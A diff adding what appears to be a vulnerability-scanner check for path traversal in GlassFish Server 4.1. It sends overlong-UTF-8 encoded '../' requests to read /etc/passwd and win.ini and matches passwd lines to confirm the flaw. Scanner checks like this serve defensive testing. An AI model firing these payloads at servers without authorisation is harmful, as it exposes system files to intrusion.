@@ -1,0 +1,57 @@
+#include helpers.inc;
+#include classMatches.inc;
+// **************************************************************************************							 
+function alert(job, fname)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(job);
+	
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************
+function TestForDirectoryTraversal(matches, job)
+{
+	var res = null;
+	
+		matches.plainArray = [
+							"; for 16-bit app support"			
+						  ];
+		
+		matches.regexArray = [
+							/((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\d\w-\s,]+:\d+:\d+:[\w-_\s,]*:[\w-_\s,\/]*:[\w-_,\/]*[\r\n])/
+						  ];	
+	
+	var matchedText = matches.searchOnText(job.response.body);	
+	if (matchedText) { alert(job, "Path_Traversal_in_Oracle_GlassFish_Server_41_Open_Source_Edition.xml"); res = 1; }
+	
+	return res;
+}
+// **************************************************************************************							 
+function request(uri)
+{
+	var http = new THTTPJob();
+		
+	http.url = scanURL;
+	http.addCookies = false;
+	http.verb = 'GET';
+	http.URI = uri;
+	http.execute();	
+	if (!http.wasError)
+	{
+		return TestForDirectoryTraversal(matches, http);
+	}	
+}
+// **************************************************************************************	
+function startTesting()
+{
+	if (request('/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd')) return;
+	if (request('/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini')) return;
+}
+/***********************************************************************************/
+/* main entry point */
+var matches = new classMatches();
+startTesting();
